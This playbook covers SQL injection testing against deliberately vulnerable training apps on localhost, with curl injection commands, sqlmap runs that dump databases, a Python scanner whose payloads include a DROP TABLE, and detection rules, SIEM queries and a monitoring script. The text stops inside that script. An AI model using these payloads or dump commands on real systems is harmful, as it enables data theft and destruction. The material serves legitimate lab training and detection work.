# Playbook 11: SQL Injection Attacks

## Overview

This playbook covers comprehensive SQL injection testing across OWASP Juice Shop, DVWA, XVWA, and WebGoat. It includes detection of various SQL injection types: union-based, boolean-based blind, time-based blind, error-based, and second-order SQL injection.

## Target Applications

- **OWASP Juice Shop**: User login, product search, order tracking
- **DVWA**: SQL Injection sections (Low/Medium/High security)
- **XVWA**: SQL injection challenges and forms
- **WebGoat**: SQL injection lessons and challenges

## Prerequisites

```bash
# Install required tools
pip3 install sqlmap requests beautifulsoup4 urllib3
brew install sqlmap  # macOS alternative

# Clone custom wordlists
git clone https://github.com/danielmiessler/SecLists.git ~/wordlists
```

## Manual Testing Commands

### 1. Basic SQL Injection Detection

```bash
# Test for error-based SQL injection
curl -X POST "http://localhost:3000/rest/user/login" \
  -H "Content-Type: application/json" \
  -d '{"email":"admin'\''","password":"password"}'

# Boolean-based blind SQL injection test
curl "http://localhost:3000/rest/products/search?q=apple' AND '1'='1"
curl "http://localhost:3000/rest/products/search?q=apple' AND '1'='2"

# Time-based blind SQL injection
curl "http://localhost:3000/rest/products/search?q=apple'; WAITFOR DELAY '00:00:05'--"
```

### 2. DVWA SQL Injection Testing

```bash
# Low security level
curl "http://localhost/dvwa/vulnerabilities/sqli/?id=1' UNION SELECT 1,2--&Submit=Submit" \
  --cookie "PHPSESSID=your_session; security=low"

# Medium security level (bypass filtering)
curl "http://localhost/dvwa/vulnerabilities/sqli/?id=1%20UNION%20SELECT%201,2--&Submit=Submit" \
  --cookie "PHPSESSID=your_session; security=medium"
```

### 3. SQLMap Automated Testing

```bash
# OWASP Juice Shop login bypass
sqlmap -u "http://localhost:3000/rest/user/login" \
  --data='{"email":"test","password":"test"}' \
  --headers="Content-Type: application/json" \
  --dbms=sqlite --technique=B --level=3 --risk=3

# DVWA parameter testing
sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=session_id; security=low" \
  --dbs --dump --batch

# WebGoat SQL injection lesson
sqlmap -u "http://localhost:8080/WebGoat/SqlInjection/attack5a" \
  --data="account=Smith&operator=and&injection=%27" \
  --technique=UB --level=5 --risk=3
```

## Automated Python Script

```python
#!/usr/bin/env python3
"""
SQL Injection Testing Framework
Comprehensive SQL injection testing for multiple web applications
"""

import requests
import json
import time
import re
import subprocess
import threading
from urllib.parse import quote, urlencode
from concurrent.futures import ThreadPoolExecutor
import logging

class SQLInjectionTester:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36'
        })
        self.results = []
        self.setup_logging()

    def setup_logging(self):
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler('sql_injection_results.log'),
                logging.StreamHandler()
            ]
        )
        self.logger = logging.getLogger(__name__)

    def test_juice_shop_sql_injection(self, base_url="http://localhost:3000"):
        """Test SQL injection vulnerabilities in OWASP Juice Shop"""
        self.logger.info("Testing OWASP Juice Shop SQL injection vulnerabilities")

        # SQL injection payloads
        payloads = [
            "' OR '1'='1",
            "' OR '1'='1'--",
            "' OR '1'='1'/*",
            "admin'--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' AND (SELECT COUNT(*) FROM users) > 0--",
            "'; DROP TABLE users--",
            "' OR SLEEP(5)--",
            "' OR pg_sleep(5)--"
        ]

        # Test login endpoint
        login_url = f"{base_url}/rest/user/login"
        for payload in payloads:
            try:
                data = {"email": f"admin{payload}", "password": "password"}
                response = self.session.post(login_url, json=data, timeout=10)

                if self.analyze_sql_response(response, payload):
                    self.results.append({
                        'url': login_url,
                        'payload': payload,
                        'method': 'POST',
                        'vulnerable': True,
                        'response_time': response.elapsed.total_seconds()
                    })
                    self.logger.warning(f"SQL injection found: {payload}")

                time.sleep(0.5)  # Rate limiting
            except Exception as e:
                self.logger.error(f"Error testing login: {e}")

        # Test search endpoint
        search_url = f"{base_url}/rest/products/search"
        for payload in payloads:
            try:
                params = {"q": f"apple{payload}"}
                response = self.session.get(search_url, params=params, timeout=10)

                if self.analyze_sql_response(response, payload):
                    self.results.append({
                        'url': search_url,
                        'payload': payload,
                        'method': 'GET',
                        'vulnerable': True,
                        'response_time': response.elapsed.total_seconds()
                    })
                    self.logger.warning(f"SQL injection found in search: {payload}")

                time.sleep(0.5)
            except Exception as e:
                self.logger.error(f"Error testing search: {e}")

    def test_dvwa_sql_injection(self, base_url="http://localhost/dvwa", session_cookie=None):
        """Test SQL injection in DVWA"""
        self.logger.info("Testing DVWA SQL injection vulnerabilities")

        if session_cookie:
            self.session.cookies.update(session_cookie)

        security_levels = ["low", "medium", "high"]

        for level in security_levels:
            self.session.cookies.update({"security": level})
            self.logger.info(f"Testing DVWA security level: {level}")

            # Adjust payloads based on security level
            if level == "low":
                payloads = [
                    "1' OR '1'='1",
                    "1' UNION SELECT 1,2--",
                    "1' UNION SELECT user(),version()--",
                    "1' AND 1=1--",
                    "1' AND 1=2--"
                ]
            elif level == "medium":
                payloads = [
                    "1 OR 1=1",
                    "1 UNION SELECT 1,2",
                    "1 UNION SELECT user(),version()",
                    "1 AND 1=1",
                    "1 AND 1=2"
                ]
            else:  # high
                payloads = [
                    "1' LIMIT 1",
                    "1' ORDER BY 1--",
                    "1' GROUP BY 1--"
                ]

            sqli_url = f"{base_url}/vulnerabilities/sqli/"
            for payload in payloads:
                try:
                    params = {"id": payload, "Submit": "Submit"}
                    response = self.session.get(sqli_url, params=params, timeout=10)

                    if self.analyze_dvwa_response(response, payload, level):
                        self.results.append({
                            'url': sqli_url,
                            'payload': payload,
                            'security_level': level,
                            'vulnerable': True,
                            'response_time': response.elapsed.total_seconds()
                        })
                        self.logger.warning(f"DVWA SQL injection found ({level}): {payload}")

                    time.sleep(0.5)
                except Exception as e:
                    self.logger.error(f"Error testing DVWA: {e}")

    def test_blind_sql_injection(self, url, parameter, base_value="1"):
        """Test for blind SQL injection vulnerabilities"""
        self.logger.info(f"Testing blind SQL injection on {url}")

        # Boolean-based blind SQL injection tests
        true_payload = f"{base_value}' AND '1'='1"
        false_payload = f"{base_value}' AND '1'='2"

        try:
            # Get baseline response
            baseline_response = self.session.get(url, params={parameter: base_value})

            # Test true condition
            true_response = self.session.get(url, params={parameter: true_payload})

            # Test false condition
            false_response = self.session.get(url, params={parameter: false_payload})

            # Analyze responses for differences
            if (len(true_response.content) == len(baseline_response.content) and
                len(false_response.content) != len(baseline_response.content)):

                self.logger.warning("Boolean-based blind SQL injection detected")
                return True

        except Exception as e:
            self.logger.error(f"Error in blind SQL injection test: {e}")

        return False

    def test_time_based_blind_injection(self, url, parameter, base_value="1"):
        """Test for time-based blind SQL injection"""
        self.logger.info(f"Testing time-based blind SQL injection on {url}")

        # Time-based payloads for different databases
        time_payloads = [
            f"{base_value}'; WAITFOR DELAY '00:00:05'--",  # SQL Server
            f"{base_value}' AND SLEEP(5)--",                # MySQL
            f"{base_value}' AND pg_sleep(5)--",             # PostgreSQL
            f"{base_value}' AND (SELECT COUNT(*) FROM (SELECT 1 UNION SELECT 2 UNION SELECT 3) AS x)>2 AND SLEEP(5)--"
        ]

        for payload in time_payloads:
            try:
                start_time = time.time()
                response = self.session.get(url, params={parameter: payload}, timeout=10)
                end_time = time.time()

                response_time = end_time - start_time

                if response_time >= 4:  # Allow some tolerance
                    self.logger.warning(f"Time-based blind SQL injection detected: {payload}")
                    self.results.append({
                        'url': url,
                        'payload': payload,
                        'type': 'time_based_blind',
                        'response_time': response_time,
                        'vulnerable': True
                    })
                    return True

            except requests.exceptions.Timeout:
                self.logger.warning("Request timeout - possible time-based injection")
                return True
            except Exception as e:
                self.logger.error(f"Error in time-based test: {e}")

        return False

    def analyze_sql_response(self, response, payload):
        """Analyze response for SQL injection indicators"""
        sql_errors = [
            "sql syntax",
            "mysql_fetch",
            "sqlite_step",
            "postgresql",
            "ora-",
            "microsoft jet database",
            "odbc microsoft access",
            "microsoft ole db provider",
            "unclosed quotation mark",
            "quoted string not properly terminated"
        ]

        response_text = response.text.lower()

        # Check for SQL error messages
        for error in sql_errors:
            if error in response_text:
                return True

        # Check for time-based injection (response time > 4 seconds)
        if response.elapsed.total_seconds() > 4:
            return True

        # Check status code anomalies
        if response.status_code == 500:
            return True

        return False

    def analyze_dvwa_response(self, response, payload, security_level):
        """Analyze DVWA-specific responses"""
        response_text = response.text.lower()

        # Look for successful injection indicators
        success_indicators = [
            "first name:",
            "surname:",
            "user()",
            "version()",
            "database()"
        ]

        for indicator in success_indicators:
            if indicator in response_text:
                return True

        return self.analyze_sql_response(response, payload)

    def run_sqlmap_automation(self, targets):
        """Run SQLMap against multiple targets"""
        self.logger.info("Running SQLMap automation")

        sqlmap_results = []

        for target in targets:
            try:
                cmd = [
                    "sqlmap",
                    "-u", target['url'],
                    "--batch",
                    "--level", "3",
                    "--risk", "3",
                    "--technique", "BEUST",
                    "--timeout", "10",
                    "--retries", "2"
                ]

                if target.get('data'):
                    cmd.extend(["--data", target['data']])

                if target.get('headers'):
                    for header, value in target['headers'].items():
                        cmd.extend(["--header", f"{header}: {value}"])

                if target.get('cookies'):
                    cmd.extend(["--cookie", target['cookies']])

                self.logger.info(f"Running SQLMap: {' '.join(cmd)}")

                result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)

                sqlmap_results.append({
                    'target': target['url'],
                    'stdout': result.stdout,
                    'stderr': result.stderr,
                    'returncode': result.returncode
                })

                if "injectable" in result.stdout.lower():
                    self.logger.warning(f"SQLMap found injection in {target['url']}")

            except subprocess.TimeoutExpired:
                self.logger.warning(f"SQLMap timeout for {target['url']}")
            except Exception as e:
                self.logger.error(f"SQLMap error: {e}")

        return sqlmap_results

    def generate_report(self):
        """Generate comprehensive test report"""
        report = {
            'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
            'total_tests': len(self.results),
            'vulnerabilities_found': len([r for r in self.results if r.get('vulnerable')]),
            'results': self.results
        }

        # Save JSON report
        with open('sql_injection_report.json', 'w') as f:
            json.dump(report, f, indent=2)

        # Generate HTML report
        html_report = self.generate_html_report(report)
        with open('sql_injection_report.html', 'w') as f:
            f.write(html_report)

        self.logger.info(f"Report generated: {report['vulnerabilities_found']} vulnerabilities found")
        return report

    def generate_html_report(self, report):
        """Generate HTML vulnerability report"""
        html = f"""
        <!DOCTYPE html>
        <html>
        <head>
            <title>SQL Injection Test Report</title>
            <style>
                body {{ font-family: Arial, sans-serif; margin: 20px; }}
                .header {{ background-color: #f44336; color: white; padding: 10px; }}
                .summary {{ background-color: #f0f0f0; padding: 10px; margin: 10px 0; }}
                .vulnerability {{ background-color: #ffebee; border-left: 4px solid #f44336; padding: 10px; margin: 10px 0; }}
                .safe {{ background-color: #e8f5e8; border-left: 4px solid #4caf50; padding: 10px; margin: 10px 0; }}
                code {{ background-color: #f5f5f5; padding: 2px 4px; }}
            </style>
        </head>
        <body>
            <div class="header">
                <h1>SQL Injection Security Assessment Report</h1>
                <p>Generated: {report['timestamp']}</p>
            </div>

            <div class="summary">
                <h2>Executive Summary</h2>
                <p><strong>Total Tests:</strong> {report['total_tests']}</p>
                <p><strong>Vulnerabilities Found:</strong> {report['vulnerabilities_found']}</p>
                <p><strong>Risk Level:</strong> {'HIGH' if report['vulnerabilities_found'] > 0 else 'LOW'}</p>
            </div>
        """

        for result in report['results']:
            if result.get('vulnerable'):
                html += f"""
                <div class="vulnerability">
                    <h3>SQL Injection Vulnerability</h3>
                    <p><strong>URL:</strong> {result['url']}</p>
                    <p><strong>Payload:</strong> <code>{result['payload']}</code></p>
                    <p><strong>Method:</strong> {result.get('method', 'N/A')}</p>
                    <p><strong>Response Time:</strong> {result.get('response_time', 'N/A')}s</p>
                </div>
                """

        html += """
        </body>
        </html>
        """

        return html

def main():
    tester = SQLInjectionTester()

    # Test OWASP Juice Shop
    tester.test_juice_shop_sql_injection()

    # Test DVWA (requires session cookie)
    # tester.test_dvwa_sql_injection(session_cookie={"PHPSESSID": "your_session_id"})

    # Test blind SQL injection
    tester.test_blind_sql_injection("http://localhost:3000/rest/products/search", "q")

    # Test time-based blind injection
    tester.test_time_based_blind_injection("http://localhost:3000/rest/products/search", "q")

    # SQLMap automation targets
    sqlmap_targets = [
        {
            "url": "http://localhost:3000/rest/user/login",
            "data": '{"email":"test","password":"test"}',
            "headers": {"Content-Type": "application/json"}
        },
        {
            "url": "http://localhost:3000/rest/products/search?q=test"
        }
    ]

    tester.run_sqlmap_automation(sqlmap_targets)

    # Generate final report
    report = tester.generate_report()

    print(f"\n{'='*60}")
    print("SQL INJECTION TEST COMPLETE")
    print(f"{'='*60}")
    print(f"Total vulnerabilities found: {report['vulnerabilities_found']}")
    print("Reports saved:")
    print("- sql_injection_report.json")
    print("- sql_injection_report.html")
    print("- sql_injection_results.log")

if __name__ == "__main__":
    main()
```

## Attack Detection and Monitoring

### Wireshark Detection Signatures

**Display Filter for SQL Injection Attempts:**

```
http contains "union select" or
http contains "' or 1=1" or
http contains "' or '1'='1" or
http contains "admin'--" or
http contains "' union select" or
http contains "'; drop table" or
http contains "' and sleep(" or
http contains "' waitfor delay" or
http contains "' and benchmark(" or
http contains "extractvalue(" or
http contains "updatexml(" or
http.request.full_uri contains "%27%20or%20" or
http.request.full_uri contains "%27%20union%20" or
http.request.full_uri contains "%27%3b%20drop%20" or
urlencoded-form.value contains "' or 1=1" or
urlencoded-form.value contains "union select"
```

**Advanced SQL Injection Detection:**

```
# Time-based blind SQL injection
http.time > 5 and (http contains "sleep(" or http contains "waitfor delay" or http contains "benchmark(")

# Error-based SQL injection responses
http.response.code == 500 and (http contains "mysql" or http contains "postgresql" or http contains "oracle" or http contains "sql server")

# Union-based SQL injection
http contains "union" and http contains "select" and http contains "from"

# Boolean-based blind SQL injection patterns
http.request.full_uri matches "(%27|').*(and|or).*(=|<|>|like).*(%27|')"
```

### Splunk Detection Queries

**Basic SQL Injection Detection:**

```spl
index=web_logs
| rex field=_raw "(?<uri_query>[^?\s]+\?[^\s]*)"
| rex field=uri_query "(?i)(?<sqli_pattern>(union\s+select|'\s+or\s+.*=|admin'--|';\s*drop\s+table|'\s+and\s+sleep\(|'\s+waitfor\s+delay|extractvalue\(|updatexml\(|'\s+union\s+all\s+select|'\s+and\s+\d+=\d+|'\s+or\s+\d+=\d+))"
| where isnotnull(sqli_pattern)
| eval injection_type=case(
    match(sqli_pattern, "(?i)union\s+select"), "Union-based",
    match(sqli_pattern, "(?i)'\s+or\s+.*="), "Boolean-based",
    match(sqli_pattern, "(?i)sleep\(|waitfor|benchmark\("), "Time-based",
    match(sqli_pattern, "(?i)extractvalue|updatexml"), "Error-based",
    1=1, "Generic"
)
| stats count by src_ip, dest_ip, uri_path, injection_type, sqli_pattern
| where count > 1
| sort -count
```

**Advanced SQL Injection Analytics:**

```spl
index=web_logs
| eval sqli_score=0
| eval sqli_score=if(match(_raw, "(?i)(union|select.*from)"), sqli_score+5, sqli_score)
| eval sqli_score=if(match(_raw, "(?i)('\s+or\s+.*=|admin'--)"), sqli_score+4, sqli_score)
| eval sqli_score=if(match(_raw, "(?i)(sleep\(|waitfor\s+delay|benchmark\()"), sqli_score+6, sqli_score)
| eval sqli_score=if(match(_raw, "(?i)(extractvalue|updatexml|floor\(rand\(\))"), sqli_score+5, sqli_score)
| eval sqli_score=if(match(_raw, "(?i)(';\s*drop|insert\s+into|delete\s+from)"), sqli_score+7, sqli_score)
| eval sqli_score=if(match(_raw, "(?i)(information_schema|sys\.databases)"), sqli_score+3, sqli_score)
| where sqli_score >= 4
| eval risk_level=case(
    sqli_score >= 10, "Critical",
    sqli_score >= 7, "High",
    sqli_score >= 4, "Medium",
    1=1, "Low"
)
| stats count, max(sqli_score) as max_score by src_ip, risk_level, uri_path
| sort -max_score
```

**SQL Injection Response Analysis:**

```spl
index=web_logs
| rex field=_raw "(?<sqli_attempt>(union\s+select|'\s+or\s+.*=|admin'--|';\s*drop))"
| where isnotnull(sqli_attempt)
| eval response_analysis=case(
    status=500, "Server Error (Potential Success)",
    status=200 AND response_size>average_size*1.5, "Larger Response (Data Extraction)",
    status=200 AND response_time>5, "Delayed Response (Time-based)",
    status=403, "Blocked by WAF",
    1=1, "Normal Response"
)
| stats count by src_ip, sqli_attempt, status, response_analysis
| sort -count
```

### SIEM Integration

**QRadar AQL Query:**

```sql
SELECT
    sourceip,
    destinationip,
    "URL" as url,
    payload,
    eventcount,
    CASE
        WHEN payload ILIKE '%union%select%' THEN 'Union-based SQLi'
        WHEN payload ILIKE '%''%or%' THEN 'Boolean-based SQLi'
        WHEN payload ILIKE '%sleep(%' OR payload ILIKE '%waitfor%delay%' THEN 'Time-based SQLi'
        WHEN payload ILIKE '%extractvalue%' OR payload ILIKE '%updatexml%' THEN 'Error-based SQLi'
        ELSE 'Generic SQLi'
    END as injection_type
FROM events
WHERE
    devicetype = 12 AND
    (payload ILIKE '%union%select%' OR
     payload ILIKE '%''%or%1=1%' OR
     payload ILIKE '%admin''---%' OR
     payload ILIKE '%'';%drop%table%' OR
     payload ILIKE '%sleep(%' OR
     payload ILIKE '%waitfor%delay%')
    AND eventtime > NOW() - INTERVAL '1 HOUR'
ORDER BY eventtime DESC
LIMIT 100
```

**Elastic Stack Detection Rule:**

```json
{
  "query": {
    "bool": {
      "should": [
        {
          "regexp": {
            "http.request.body.content": ".*('|%27).*(union|select|insert|delete|drop|update).*"
          }
        },
        {
          "regexp": {
            "url.query": ".*('|%27).*(or|and).*(=|<|>).*"
          }
        },
        {
          "match_phrase": {
            "http.request.body.content": "admin'--"
          }
        },
        {
          "regexp": {
            "url.full": ".*(sleep\\(|waitfor.*delay|benchmark\\().*"
          }
        }
      ],
      "minimum_should_match": 1,
      "filter": [
        {
          "range": {
            "@timestamp": {
              "gte": "now-1h"
            }
          }
        }
      ]
    }
  }
}
```

### Network Security Monitoring

**Suricata Rules:**

```bash
# Basic SQL injection detection
alert http any any -> any any (msg:"SQL Injection - Union Select"; content:"union"; nocase; content:"select"; nocase; distance:0; within:20; sid:1001; rev:1;)

alert http any any -> any any (msg:"SQL Injection - Boolean OR attack"; content:"' or "; nocase; content:"="; distance:0; within:10; sid:1002; rev:1;)

alert http any any -> any any (msg:"SQL Injection - Admin comment bypass"; content:"admin'--"; nocase; sid:1003; rev:1;)

alert http any any -> any any (msg:"SQL Injection - Time-based blind"; content:"sleep("; nocase; sid:1004; rev:1;)

alert http any any -> any any (msg:"SQL Injection - Time-based MSSQL"; content:"waitfor delay"; nocase; sid:1005; rev:1;)

alert http any any -> any any (msg:"SQL Injection - Error-based MySQL"; content:"extractvalue("; nocase; sid:1006; rev:1;)

# Advanced SQL injection patterns
alert http any any -> any any (msg:"SQL Injection - Information Schema Access"; content:"information_schema"; nocase; sid:1007; rev:1;)

alert http any any -> any any (msg:"SQL Injection - System Database Access"; content:"sys.databases"; nocase; sid:1008; rev:1;)

alert http any any -> any any (msg:"SQL Injection - Drop Table Attempt"; content:"drop table"; nocase; sid:1009; rev:1;)
```

**Snort Rules:**

```bash
alert tcp any any -> any [80,443,8080,8443] (msg:"SQL Injection Union Select"; flow:established,to_server; content:"union"; nocase; content:"select"; nocase; distance:1; within:50; classtype:web-application-attack; sid:1000001; rev:1;)

alert tcp any any -> any [80,443,8080,8443] (msg:"SQL Injection OR 1=1"; flow:established,to_server; content:"or 1=1"; nocase; classtype:web-application-attack; sid:1000002; rev:1;)

alert tcp any any -> any [80,443,8080,8443] (msg:"SQL Injection Comment Bypass"; flow:established,to_server; content:"'--"; classtype:web-application-attack; sid:1000003; rev:1;)
```

### Log Analysis Scripts

**Apache/Nginx Log Analysis (Bash):**

```bash
#!/bin/bash

LOG_FILE="/var/log/apache2/access.log"
ALERT_THRESHOLD=5
OUTPUT_FILE="/tmp/sqli_detection_$(date +%Y%m%d_%H%M%S).txt"

echo "SQL Injection Detection Analysis - $(date)" > "$OUTPUT_FILE"
echo "=============================================" >> "$OUTPUT_FILE"

# Detect common SQL injection patterns
echo -e "\n[+] Union-based SQL Injection Attempts:" >> "$OUTPUT_FILE"
grep -i "union.*select" "$LOG_FILE" | tail -20 >> "$OUTPUT_FILE"

echo -e "\n[+] Boolean-based SQL Injection Attempts:" >> "$OUTPUT_FILE"
grep -E "('|\%27).*(or|and).*(=|\%3d)" "$LOG_FILE" | tail -20 >> "$OUTPUT_FILE"

echo -e "\n[+] Time-based SQL Injection Attempts:" >> "$OUTPUT_FILE"
grep -iE "(sleep\(|waitfor.*delay|benchmark\()" "$LOG_FILE" | tail -20 >> "$OUTPUT_FILE"

echo -e "\n[+] Error-based SQL Injection Attempts:" >> "$OUTPUT_FILE"
grep -iE "(extractvalue|updatexml|floor.*rand)" "$LOG_FILE" | tail -20 >> "$OUTPUT_FILE"

# IP frequency analysis
echo -e "\n[+] Top Source IPs for SQL Injection:" >> "$OUTPUT_FILE"
grep -iE "(union.*select|'.*or.*=|sleep\(|extractvalue)" "$LOG_FILE" | \
awk '{print $1}' | sort | uniq -c | sort -nr | head -10 >> "$OUTPUT_FILE"

# Alert on suspicious activity
SQLI_COUNT=$(grep -icE "(union.*select|'.*or.*=|sleep\()" "$LOG_FILE")
if [ "$SQLI_COUNT" -gt "$ALERT_THRESHOLD" ]; then
    echo -e "\n[!] ALERT: $SQLI_COUNT SQL injection attempts detected!" >> "$OUTPUT_FILE"
    echo "Threshold: $ALERT_THRESHOLD" >> "$OUTPUT_FILE"
fi

echo "Analysis complete. Results saved to: $OUTPUT_FILE"
```

**IIS Log Analysis (PowerShell):**

```powershell
param(
    [string]$LogPath = "C:\inetpub\logs\LogFiles\W3SVC1\",
    [int]$Hours = 24
)

$StartTime = (Get-Date).AddHours(-$Hours)
$OutputFile = "SQLi_Detection_$(Get-Date -Format 'yyyyMMdd_HHmmss').txt"

"SQL Injection Detection Analysis - $(Get-Date)" | Out-File $OutputFile
"=============================================" | Out-File $OutputFile -Append

# Get recent log files
$LogFiles = Get-ChildItem $LogPath -Filter "*.log" | Where-Object {$_.LastWriteTime -gt $StartTime}

foreach ($LogFile in $LogFiles) {
    $Content = Get-Content $LogFile.FullName

    # Union-based attacks
    $UnionAttacks = $Content | Select-String -Pattern "union.*select" -AllMatches
    if ($UnionAttacks) {
        "`n[+] Union-based SQL Injection in $($LogFile.Name):" | Out-File $OutputFile -Append
        $UnionAttacks | Select-Object -First 10 | Out-File $OutputFile -Append
    }

    # Boolean-based attacks
    $BooleanAttacks = $Content | Select-String -Pattern "('|%27).*(or|and).*(=|%3d)" -AllMatches
    if ($BooleanAttacks) {
        "`n[+] Boolean-based SQL Injection in $($LogFile.Name):" | Out-File $OutputFile -Append
        $BooleanAttacks | Select-Object -First 10 | Out-File $OutputFile -Append
    }

    # Time-based attacks
    $TimeAttacks = $Content | Select-String -Pattern "(sleep\(|waitfor.*delay)" -AllMatches
    if ($TimeAttacks) {
        "`n[+] Time-based SQL Injection in $($LogFile.Name):" | Out-File $OutputFile -Append
        $TimeAttacks | Select-Object -First 10 | Out-File $OutputFile -Append
    }
}

Write-Host "Analysis complete. Results saved to: $OutputFile"
```

### Python Behavioral Detection Script

```python
#!/usr/bin/env python3
"""
SQL Injection Attack Detection and Analysis System
Real-time monitoring and behavioral analysis
"""

import re
import json
import time
import sqlite3
import hashlib
from datetime import datetime, timedelta
from collections import defaultdict, Counter
from urllib.parse import unquote
import logging

class SQLInjectionDetector:
    def __init__(self, db_path="sqli_detection.db"):
        self.db_path = db_path
        self.setup_database()
        self.setup_logging()

        # SQL injection patterns
        self.patterns = {
            'union_based': [
                r'union\s+select',
                r'union\s+all\s+select',
                r'\'\s+union\s+select'
            ],
            'boolean_based': [
                r"'\s+or\s+\d+=\d+",
                r"'\s+or\s+'[^']*'\s*=\s*'[^']*'",
                r"'\s+and\s+\d+=\d+",
                r"admin'--"
            ],
            'time_based': [
                r'sleep\s*\(\s*\d+\s*\)',
                r'waitfor\s+delay\s+',
                r'benchmark\s*\(\s*\d+',
                r'pg_sleep\s*\(\s*\d+\s*\)'
            ],
            'error_based': [
                r'extractvalue\s*\(',
                r'updatexml\s*\(',
                r'floor\s*\(\s*rand\s*\(\s*\)\s*\*',
                r'exp\s*\(\s*~\s*\('
            ],
            'stacked_queries': [
                r';\s*drop\s+table',
                r';\s*delete\s+from',
                r';\s*insert\s+into',
                r';\s*update\s+.*\s+set'
            ]
        }

        # Thresholds for detection
        self.thresholds = {
            'attempts_per_ip': 10,
            'attempts_per_minute': 20,
            'unique_patterns_per_ip': 5,
            'time_window': 300  # 5 minutes
        }

        # Tracking dictionaries
        self.ip_attempts = defaultdict(list)
        self.pattern_matches = defaultdict(list)

    def setup_database(self):
        """Initialize SQLite database for tracking"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()

        cursor.execute('''
            CREATE TABLE IF NOT EXISTS sqli_attempts (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TEXT,
                source_ip TEXT,
                target_url TEXT,
                payload TEXT,
                injection_type TEXT,
                risk_score INTEGER,
                blocked BOOLEAN
            )
        ''')

        cursor.execute('''
            CREATE TABLE IF NOT EXISTS ip_reputation (
                ip_address TEXT PRIMARY KEY,
                reputation_score INTEGER,
                last_updated TEXT,
                total_attempts INTEGER,
                blocked_attempts INTEGER
            )
        ''')

        conn.commit()
        conn.close()

    def setup_logging(self):
        """Configure logging"""
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler('sqli_detector.log'),
                logging.StreamHandler()
            ]
        )
        self.logger = logging.getLogger(__name__)

    def analyze_request(self, request_data):
        """
        Analyze HTTP request for SQL injection patterns

        Args:
            request_data (dict): Contains 'ip', 'url', 'params', 'body', 'headers'

        Returns:
            dict: Analysis results
        """
        source_ip = request_data.get('ip')
        url = request_data.get('url', '')
        params = request_data.get('params', {})
        body = request_data.get('body', '')

        # Combine all input data
        combined_input = f"{url} {json.dumps(params)} {body}"
        decoded_input = unquote(combined_input).lower()

        detection_results = {
            'timestamp': datetime.now().isoformat(),
            'source_ip': source_ip,
            'target_url': url,
            'detected_patterns': [],
            'injection_types': [],
            'risk_score': 0,
            'should_block': False
        }

        # Pattern matching
        for injection_type, patterns in self.patterns.items():
            for pattern in patterns:
                matches = re.finditer(pattern, decoded_input, re.IGNORECASE)
                for match in matches:
                    detection_results['detected_patterns'].append({
                        'type': injection_type,
                        'pattern': pattern,
                        'match': match.group(),
                        'position': match.span()
                    })

                    if injection_type not in detection_results['injection_types']:
                        detection_results['injection_types'].append(injection_type)

        # Calculate risk score
        detection_results['risk_score'] = self.calculate_risk_score(detection_results)

        # Behavioral analysis
        if detection_results['detected_patterns']:
            self.update_behavioral_tracking(source_ip, detection_results)
            detection_results['should_block'] = self.should_block_ip(source_ip)

            # Log to database
            self.log_attempt(detection_results, combined_input)

        return detection_results

    def calculate_risk_score(self, detection_results):
        """Calculate risk score based on detected patterns"""
        score = 0
        type_scores = {
            'union_based': 8,
            'boolean_based': 6,
            'time_based': 9,
            'error_based': 7,
            'stacked_queries': 10
        }

        for pattern_data in detection_results['detected_patterns']:
            injection_type = pattern_data['type']
            score += type_scores.get(injection_type, 5)

        # Bonus for multiple types
        if len(detection_results['injection_types']) > 1:
            score += len(detection_results['injection_types']) * 2

        return min(score, 100)  # Cap at 100

    def update_behavioral_tracking(self, source_ip, detection_results):
        """Update behavioral tracking for IP address"""
        current_time = datetime.now()

        # Clean old entries
        cutoff_time = current_time - timedelta(seconds=self.thresholds['time_window'])
        self.ip_attempts[source_ip] = [
            attempt for attempt in self.ip_attempts[source_ip]
            if attempt['timestamp'] > cutoff_time
        ]

        # Add new attempt
        self.ip_attempts[source_ip].append({
            'timestamp': current_time,
            'risk_score': detection_results['risk_score'],
            'injection_types': detection_results['injection_types']
        })

    def should_block_ip(self, source_ip):
        """Determine if IP should be blocked based on behavioral analysis"""
        attempts = self.ip_attempts.get(source_ip, [])

        if len(attempts) >= self.thresholds['attempts_per_ip']:
            return True

        # Check for rapid-fire attempts
        if len(attempts) >= 5:
            recent_attempts = [a for a in attempts if
                             a['timestamp'] > datetime.now() - timedelta(minutes=1)]
            if len(recent_attempts) >= self.thresholds['attempts_per_minute']:
                return True

        # Check for diverse attack patterns
        all_types = set()
        for attempt in attempts:
            all_types.update(attempt['injection_types'])
        if len(all_types) >= self.thresholds['unique_patterns_per_ip']:
            return True

        return False

    def log_attempt(self, detection_results, payload):
        """Log attempt to database"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()

        cursor.execute('''
            INSERT INTO sqli_attempts
            (timestamp, source_ip, target_url, payload, injection_type, risk_score, blocked)
            VALUES (?, ?, ?, ?, ?, ?, ?)
        ''', (
            detection_results['timestamp'],
            detection_results['source_ip'],
            detection_results['target_url'],
            payload[:500],  # Truncate long payloads
            ','.join(detection_results['injection_types']),
            detection_results['risk_score'],
            detection_results['should_block']
        ))

        # Update IP reputation
        cursor.execute('''
            INSERT OR REPLACE INTO ip_reputation
            (ip_address, reputation_score, last_updated, total_attempts, blocked_attempts)
            VALUES (?, ?, ?,
                    COALESCE((SELECT total_attempts FROM ip_reputation WHERE ip_address = ?), 0) + 1,
                    COALESCE((SELECT blocked_attempts FROM ip_reputation WHERE ip_address = ?), 0) + ?)
        ''', (
            detection_results['source_ip'],
            max(0, 100 - detection_results['risk_score']),
            detection_results['timestamp'],
            detection_results['source_ip'],
            detection_results['source_ip'],
            1 if detection_results['should_block'] else 0
        ))

        conn.commit()
        conn.close()

    def generate_report(self, hours=24):
        """Generate detection report"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()

        cutoff_time = (datetime.now() - timedelta(hours=hours)).isoformat()

